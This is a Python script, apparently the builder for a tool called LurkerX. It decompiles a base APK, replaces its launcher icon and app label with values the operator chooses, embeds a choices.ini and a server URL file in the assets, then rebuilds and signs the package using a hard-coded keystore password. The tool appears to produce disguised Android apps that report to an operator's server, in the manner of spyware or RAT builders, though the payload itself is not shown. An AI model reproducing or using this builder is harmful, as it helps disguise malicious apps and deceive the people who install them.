import os
import shutil
import subprocess
from helper import load_manifest, load_ini, clear_screen, type_text, get_colored_figlet
from colorama import Fore, Style
import platform

if platform.system() == "Windows":
    APKTOOL_PATH = os.path.join(os.getcwd(), "apktool.bat")
else:
    APKTOOL_PATH = os.path.join(os.getcwd(), "apktool")

ANDROID_SDK_BUILD_TOOLS = os.path.join(os.getcwd(), "build-tools", "35.0.1")
ZIPALIGN = os.path.join(ANDROID_SDK_BUILD_TOOLS, "zipalign" + (".exe" if platform.system() == "Windows" else ""))
APKSIGNER = os.path.join(ANDROID_SDK_BUILD_TOOLS, "apksigner" + (".bat" if platform.system() == "Windows" else ""))
WORK_DIR = "workdir"
OUTPUT_APK = "final.apk"

def modify_apk(app_name, app_icon, base_apk):
    """Handles APK decompile, modification, and rebuild."""

    print(f"[+] Modifying APK: Name={app_name}, Icon={app_icon}")

    # Step 1: Decompile
    if os.path.exists(WORK_DIR):
        shutil.rmtree(WORK_DIR)
    subprocess.run([APKTOOL_PATH, "d", base_apk, "-o", WORK_DIR, "-f"], check=True)

    # Step 2: Replace Icon
    icon_dirs = ["mipmap-hdpi", "mipmap-mdpi", "mipmap-xhdpi", "mipmap-xxhdpi", "mipmap-xxxhdpi"]
    for density in icon_dirs:
        dest = os.path.join(WORK_DIR, "res", density, "ic_launcher.png")
        if os.path.exists(dest):
            shutil.copy(app_icon, dest)
            print(f"[+] Icon replaced in {density}")

    # Step 3: Update App Name
    manifest_file = os.path.join(WORK_DIR, "AndroidManifest.xml")
    if os.path.exists(manifest_file):
        if os.path.exists(manifest_file):
            with open(manifest_file, "r", encoding="utf-8") as f:
                manifest_content = f.read()
        manifest_content = manifest_content.replace('android:label="LurkerX"', f'android:label="{app_name}"')
        with open(manifest_file, "w", encoding="utf-8") as f:
            f.write(manifest_content)
        print("[+] App name updated")

    # Step 4: Copy INI to assets
    assets_path = os.path.join(WORK_DIR, "assets", "flutter_assets", "assets")
    os.makedirs(assets_path, exist_ok=True)
    shutil.copy("choices.ini", os.path.join(assets_path, "choices.ini"))
    shutil.copy("server_url.txt", os.path.join(assets_path, "server_url.txt"))
    print("[+] choices.ini and server_url.txt copied to assets")

    # Step 5: Rebuild
    subprocess.run([APKTOOL_PATH, "b", WORK_DIR, "-o", OUTPUT_APK], check=True)

    # Step 6: Align & Sign
    aligned_apk = OUTPUT_APK.replace(".apk", "_aligned.apk")
    signed_apk = OUTPUT_APK.replace(".apk", "_signed.apk")

    # Clean old aligned/signed outputs if they exist
    for apk_file in (aligned_apk, signed_apk):
        if os.path.exists(apk_file):
            os.remove(apk_file)

    # Align
    subprocess.run([ZIPALIGN, "-v", "4", OUTPUT_APK, aligned_apk], check=True)

    # Sign
    subprocess.run([
        APKSIGNER, "sign",
        "--ks", "mykey.jks", "--ks-pass", "pass:password",
        "--out", signed_apk, aligned_apk
    ], check=True)

    print(f"[+] Signed APK ready: {signed_apk}")

if __name__ == "__main__":
    clear_screen()

    # Load configs
    manifest = load_manifest("manifest.json")
    ini = load_ini("choices.ini")

    lurkerx_version = manifest.get("version", "1.0.0")
    author = manifest.get("author", "Unknown")
    collaborator = manifest.get("collaborator", "Unknown")
    base_apk_file = ini.get("decompile", "from", fallback="lurkerx-apk.apk")
    app_name = ini.get("about_app", "name")
    app_icon = ini.get("about_app", "icon")

    # Doom banner
    print(get_colored_figlet())
    type_text(f"Author: {author}\n", Fore.YELLOW)
    type_text(f"Collaborator: {collaborator}\n", Fore.YELLOW)
    type_text(f"You are using LURKERX version {lurkerx_version}\n", Fore.CYAN)
    print()

    # Modify APK
    modify_apk(app_name, app_icon, base_apk_file)
    type_text("APK modification complete! Check the output directory for the final APK.\n", Fore.GREEN)